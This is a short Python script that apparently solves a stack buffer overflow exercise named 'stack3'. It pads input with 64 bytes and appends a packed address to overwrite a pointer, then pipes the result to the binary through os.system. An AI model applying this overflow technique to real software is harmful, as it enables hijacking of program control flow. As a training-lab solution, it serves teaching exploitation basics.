#!/usr/bin/env python
import struct as s, os
a = '_'*64
a += s.pack('<i', 0x8048424)
os.system('echo -n {0} | stack3'.format(a))
